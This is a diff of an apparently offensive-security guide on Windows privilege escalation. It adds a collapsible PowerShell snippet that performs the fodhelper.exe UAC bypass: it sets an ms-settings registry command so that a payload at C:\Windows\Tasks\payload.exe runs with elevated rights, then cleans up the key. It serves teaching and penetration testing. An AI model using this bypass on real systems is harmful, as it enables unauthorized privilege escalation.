@@ -175,6 +175,22 @@ This can now be executed on the target by _choosing a technique_, and a program 
 <strong>Mandatory Label\High Mandatory Level   Label            S-1-16-12288
 </strong></code></pre>
 
+<details>
+
+<summary>Manual fodhelper.exe Payload</summary>
+
+```powershell
+$key = "HKCU\Software\Classes\ms-settings\Shell\Open\command"
+cmd /c "reg add $key /v `"DelegateExecute`" /d `"`" /f"
+cmd /c "reg add $key /d `"C:\Windows\Tasks\payload.exe`" /f"
+
+fodhelper.exe
+sleep 1
+reg delete $key /f
+```
+
+</details>
+
 ## DLL Hijacking
 
 Programs in Windows have assembled code that they execute, but also often load libraries and call their code to prevent having every program include some basic functionality. Which libraries to load can be completely decided by the program, and they can even make their own custom libraries (DLLs). When the program is started, directories are **searched** for the library names in the **following order**:
